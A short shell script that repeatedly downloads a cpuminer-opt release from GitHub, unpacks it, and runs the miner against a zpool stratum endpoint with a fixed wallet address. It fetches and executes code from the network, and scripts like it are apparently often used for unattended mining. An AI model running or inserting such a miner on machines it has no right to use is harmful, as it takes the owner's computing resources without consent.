#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-avx2 -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u DFtFJRa7oUzbBpUxYLXFaeTVDwyidT1TMk -p c=DGB,zap=PYRK-lyra2z330 -q

     echo COUNTER $COUNTER
     let COUNTER-=1
done
